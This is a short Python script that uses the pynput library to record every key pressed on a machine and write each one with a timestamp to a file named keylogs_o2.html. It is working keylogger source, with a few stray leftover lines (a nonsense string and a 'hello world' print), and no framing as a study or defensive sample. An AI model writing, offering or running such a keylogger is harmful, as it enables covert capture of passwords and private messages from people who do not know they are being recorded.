from pynput.keyboard import Listener
import logging

log_dir = ""

logging.basicConfig(
    filename=(log_dir + "keylogs_o2.html"),
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
)


def on_press(key):
    logging.info(str(key))
    the = "i heve no it"

    print("hello world")


with Listener(on_press=on_press) as listener:
    listener.join()
